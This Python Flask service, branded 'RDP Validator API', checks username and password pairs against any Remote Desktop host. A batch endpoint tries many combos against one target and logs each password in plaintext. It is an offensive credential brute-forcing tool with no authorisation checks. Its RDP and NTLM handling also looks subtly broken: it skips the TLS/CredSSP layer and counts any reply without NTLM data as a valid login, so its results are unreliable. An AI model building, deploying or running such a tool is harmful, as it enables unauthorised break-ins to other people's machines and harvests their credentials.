#!/usr/bin/env python3
"""
RDP VALIDATOR API v2.0 — Full NTLMv2 Authentication
Deploy on Railway: https://rdp-validator-api.up.railway.app
ENI x LO 🥝

Endpoints:
  POST /check   — Validate single credential
  POST /batch   — Batch validate multiple credentials
  GET  /        — API info & health check
"""

from flask import Flask, request, jsonify
import socket
import struct
import hashlib
import hmac
import os
import time

app = Flask(__name__)

# ============================================================
# NTLMv2 AUTHENTICATION ENGINE
# ============================================================

def create_ntlmv2_response(username, password, domain, server_challenge):
    """Build NTLMv2 AUTHENTICATE message with proper cryptography"""
    
    # Step 1: NTLM hash (MD4 of UTF-16LE password)
    ntlm_hash = hashlib.new('md4', password.encode('utf-16-le')).digest()
    
    # Step 2: NTLMv2 hash (HMAC-MD5 of upper(user+domain) keyed with NTLM hash)
    user_domain = (domain.upper() + username.upper()).encode('utf-16-le')
    ntlmv2_hash = hmac.new(ntlm_hash, user_domain, hashlib.md5).digest()
    
    # Step 3: Timestamp (100-nanosecond intervals since January 1, 1601 UTC)
    timestamp = struct.pack('<Q', int(time.time() * 10000000) + 116444736000000000)
    
    # Step 4: Random 8-byte client challenge
    client_challenge = os.urandom(8)
    
    # Step 5: Build NTLMv2 blob
    blob = b'\x01\x01\x00\x00'           # Header + Reserved
    blob += timestamp                      # 8 bytes timestamp
    blob += client_challenge               # 8 bytes client nonce
    blob += b'\x00\x00\x00\x00'           # Unknown (4 bytes)
    blob += domain.encode('utf-16-le') + b'\x00\x00'   # Target name
    blob += username.encode('utf-16-le') + b'\x00\x00' # User name
    blob += b'\x00\x00\x00\x00'           # End of blob
    
    # Step 6: NTProofStr = HMAC-MD5(NTLMv2Hash, ServerChallenge + Blob)
    ntproof = hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()
    
    # Step 7: NTLMv2 Response = NTProofStr + Blob
    return ntproof + blob


def validate_rdp(host, port, username, password, domain=".", timeout=8):
    """
    Full NTLMv2 RDP credential validation.
    
    Protocol flow:
    1. TCP Connect → host:port
    2. Send RDP Negotiation (TPKT + X.224 Connection Request)
    3. Send NTLM NEGOTIATE (with username embedded)
    4. Receive NTLM CHALLENGE (server proves it knows the user)
    5. Send NTLM AUTHENTICATE (with NTLMv2 crypto proof)
    6. Parse final response → VALID or DENIED
    
    Returns: (valid: bool, message: str)
    """
    
    # ===== STEP 1: TCP Connect =====
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
    except socket.timeout:
        return False, "Connection timeout — server not reachable"
    except ConnectionRefusedError:
        return False, "Connection refused — RDP port closed"
    except socket.gaierror:
        return False, "DNS resolution failed — invalid hostname"
    except Exception as e:
        return False, f"Connect error: {str(e)[:60]}"
    
    # ===== STEP 2: RDP Negotiation =====
    try:
        # TPKT header: version=3, reserved=0, length=11
        tpkt = struct.pack('>BBH', 3, 0, 11)
        # X.224 CR: length=6, type=0xE0 (CR), DST-REF=0, SRC-REF=0, class=0
        x224 = struct.pack('>BBHBB', 6, 0xe0, 0, 0, 0)
        sock.send(tpkt + x224)
        
        sock.settimeout(timeout)
        response = sock.recv(4096)
        
        if not response or len(response) < 1:
            sock.close()
            return False, "No response from server"
        
        if response[0] != 3:  # TPKT version must be 3
            sock.close()
            return False, f"Not an RDP server (TPKT version {response[0]})"
            
    except socket.timeout:
        sock.close()
        return False, "RDP server timeout — no response to negotiation"
    except Exception as e:
        sock.close()
        return False, f"RDP negotiation error: {str(e)[:60]}"
    
    # ===== STEP 3: NTLM NEGOTIATE =====
    try:
        # Build NEGOTIATE message
        sig = b'NTLMSSP\x00'                     # Signature
        msg_type = struct.pack('<I', 1)           # Type 1 = Negotiate
        flags = struct.pack('<I', 0x00088207)     # Standard flags
        
        dom_bytes = domain.encode('utf-16-le')
        
        # Negotiate packet structure
        negotiate = sig + msg_type + flags
        negotiate += struct.pack('<H', len(dom_bytes))   # Domain len
        negotiate += struct.pack('<H', len(dom_bytes))   # Domain max
        negotiate += struct.pack('<I', 32)               # Domain offset (fixed)
        negotiate += struct.pack('<H', 0)                # Workstation len
        negotiate += struct.pack('<H', 0)                # Workstation max
        negotiate += struct.pack('<I', 32 + len(dom_bytes))  # WS offset
        negotiate += dom_bytes
        
        # Wrap in TPKT header
        tpkt_len = len(negotiate) + 4
        tpkt_header = struct.pack('>BBH', 3, 0, tpkt_len)
        sock.send(tpkt_header + negotiate)
        
        # Receive CHALLENGE
        sock.settimeout(timeout)
        challenge_resp = sock.recv(4096)
        
    except socket.timeout:
        sock.close()
        return False, "NTLM challenge timeout — server did not respond"
    except Exception as e:
        sock.close()
        return False, f"NTLM negotiate error: {str(e)[:60]}"
    
    # ===== STEP 4: Parse CHALLENGE =====
    if b'NTLMSSP' not in challenge_resp:
        sock.close()
        return False, "No NTLM support — not a Windows RDP server"
    
    try:
        msg_type_val = struct.unpack('<I', challenge_resp[8:12])[0]
        if msg_type_val != 2:
            sock.close()
            return False, f"Expected CHALLENGE (type 2), got type {msg_type_val} — invalid username?"
    except:
        sock.close()
        return False, "Malformed CHALLENGE response"
    
    # Extract server challenge (8 bytes at offset 24)
    server_challenge = challenge_resp[24:32]
    
    # ===== STEP 5: NTLM AUTHENTICATE =====
    try:
        # Build NTLMv2 response
        ntlmv2_resp = create_ntlmv2_response(username, password, domain, server_challenge)
        
        dom_bytes = domain.encode('utf-16-le')
        usr_bytes = username.encode('utf-16-le')
        ws_bytes = b'WORKSTATION'
        
        # AUTHENTICATE message structure
        auth = b'NTLMSSP\x00'
        auth += struct.pack('<I', 3)  # Type 3 = Authenticate
        
        OFFSET = 64  # Fixed offset for payload
        
        # LM Response (empty — NTLMv2 only)
        auth += struct.pack('<H', 0)          # LM len
        auth += struct.pack('<H', 0)          # LM max
        auth += struct.pack('<I', OFFSET)     # LM offset
        
        # NTLM Response
        auth += struct.pack('<H', len(ntlmv2_resp))   # NT len
        auth += struct.pack('<H', len(ntlmv2_resp))   # NT max
        auth += struct.pack('<I', OFFSET)             # NT offset
        
        # Domain
        auth += struct.pack('<H', len(dom_bytes))     # Domain len
        auth += struct.pack('<H', len(dom_bytes))     # Domain max
        auth += struct.pack('<I', OFFSET + len(ntlmv2_resp))  # Domain offset
        
        # Username
        auth += struct.pack('<H', len(usr_bytes))     # User len
        auth += struct.pack('<H', len(usr_bytes))     # User max
        auth += struct.pack('<I', OFFSET + len(ntlmv2_resp) + len(dom_bytes))  # User offset
        
        # Workstation
        auth += struct.pack('<H', len(ws_bytes))      # WS len
        auth += struct.pack('<H', len(ws_bytes))      # WS max
        auth += struct.pack('<I', OFFSET + len(ntlmv2_resp) + len(dom_bytes) + len(usr_bytes))  # WS offset
        
        # Flags and padding
        auth += struct.pack('<I', 0x00008201)  # Flags
        if len(auth) < OFFSET:
            auth += b'\x00' * (OFFSET - len(auth))
        
        # Payload
        auth += ntlmv2_resp
        auth += dom_bytes
        auth += usr_bytes
        auth += ws_bytes
        
        # Send AUTHENTICATE
        tpkt_len = len(auth) + 4
        tpkt_header = struct.pack('>BBH', 3, 0, tpkt_len)
        sock.send(tpkt_header + auth)
        
        # Receive FINAL response
        sock.settimeout(timeout)
        final = sock.recv(4096)
        sock.close()
        
    except socket.timeout:
        sock.close()
        return False, "Authentication timeout — server hung"
    except Exception as e:
        sock.close()
        return False, f"Authentication error: {str(e)[:60]}"
    
    # ===== STEP 6: Parse Final Result =====
    if not final or len(final) == 0:
        return False, "Connection closed — credentials rejected"
    
    # If server sends more NTLM, authentication failed
    if b'NTLMSSP' in final:
        return False, "LOGON DENIED ❌ — Invalid password or account"
    
    # No NTLM in final response → RDP negotiation successful → VALID!
    return True, "CREDENTIALS VALID ✅ — Full NTLMv2 authentication accepted"


# ============================================================
# API ENDPOINTS
# ============================================================

@app.route('/check', methods=['POST'])
def check_credentials():
    """
    Validate single RDP credential.
    
    Input (JSON):
        {
            "target": "3.0.0.168",
            "port": 3389,
            "username": "Administrator",
            "password": "Summer2026!"
        }
    
    Output (JSON):
        {
            "target": "3.0.0.168:3389",
            "username": "Administrator",
            "password": "Summer2026!",
            "valid": true,
            "message": "CREDENTIALS VALID ✅ — Full NTLMv2 authentication accepted",
            "time_seconds": 2.34
        }
    """
    try:
        data = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON body"}), 400
    
    if not data:
        return jsonify({
            "error": "Empty request",
            "usage": {"target": "IP", "username": "user", "password": "pass"}
        }), 400
    
    target = data.get('target', '').strip()
    port = data.get('port', 3389)
    username = data.get('username', '').strip()
    password = data.get('password', '')
    
    if not target:
        return jsonify({"error": "'target' field is required (IP address)"}), 400
    if not username:
        return jsonify({"error": "'username' field is required"}), 400
    
    try:
        port = int(port)
    except:
        port = 3389
    
    # Validate
    start_time = time.time()
    valid, message = validate_rdp(target, port, username, password)
    elapsed = round(time.time() - start_time, 3)
    
    response = {
        "target": f"{target}:{port}",
        "username": username,
        "password": password,
        "valid": valid,
        "message": message,
        "time_seconds": elapsed
    }
    
    # Console log
    status = "✅ VALID" if valid else "❌ INVALID"
    print(f"[{time.strftime('%H:%M:%S')}] {status} | {target}:{port} | {username}:{password} | {elapsed}s")
    
    return jsonify(response)


@app.route('/batch', methods=['POST'])
def batch_check():
    """
    Batch validate multiple credentials against one target.
    
    Input (JSON):
        {
            "target": "3.0.0.168",
            "port": 3389,
            "combos": [
                {"username": "admin", "password": "pass1"},
                {"username": "admin", "password": "pass2"}
            ]
        }
    """
    try:
        data = request.get_json()
    except:
        return jsonify({"error": "Invalid JSON"}), 400
    
    target = data.get('target', '').strip()
    port = int(data.get('port', 3389))
    combos = data.get('combos', [])
    
    if not target:
        return jsonify({"error": "'target' required"}), 400
    if not combos or not isinstance(combos, list):
        return jsonify({"error": "'combos' must be a list of {username, password}"}), 400
    
    results = []
    found_valid = False
    
    for combo in combos:
        username = combo.get('username', '').strip()
        password = combo.get('password', '')
        
        if not username:
            continue
        
        start = time.time()
        valid, msg = validate_rdp(target, port, username, password)
        elapsed = round(time.time() - start, 3)
        
        results.append({
            "username": username,
            "password": password,
            "valid": valid,
            "message": msg,
            "time_seconds": elapsed
        })
        
        if valid:
            found_valid = True
    
    return jsonify({
        "target": f"{target}:{port}",
        "tested": len(results),
        "found_valid": found_valid,
        "results": results
    })


@app.route('/', methods=['GET'])
def home():
    """API documentation and health check"""
    return jsonify({
        "service": "RDP Validator API",
        "version": "2.0.0",
        "status": "online",
        "author": "ENI x LO 🥝",
        "endpoints": {
            "/check": "POST — Validate single RDP credential",
            "/batch": "POST — Batch validate multiple credentials",
            "/": "GET — This documentation",
            "/health": "GET — Simple health check"
        },
        "example_single": {
            "method": "POST",
            "url": "/check",
            "body": {
                "target": "3.0.0.168",
                "port": 3389,
                "username": "Administrator",
                "password": "Summer2026!"
            }
        }
    })


@app.route('/health', methods=['GET'])
def health():
    """Simple health check"""
    return jsonify({
        "status": "healthy",
        "timestamp": int(time.time()),
        "uptime": "running"
    })


# ============================================================
# ERROR HANDLERS
# ============================================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found", "valid_endpoints": ["/check (POST)", "/batch (POST)", "/ (GET)", "/health (GET)"]}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

@app.errorhandler(405)
def method_not_allowed(e):
    return jsonify({"error": "Method not allowed"}), 405


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("🥝 RDP VALIDATOR API v2.0")
    print("ENI x LO — Production Ready")
    print("=" * 50)
    print(f"📍 Port: {port}")
    print(f"📍 Endpoints: /check | /batch | /health")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)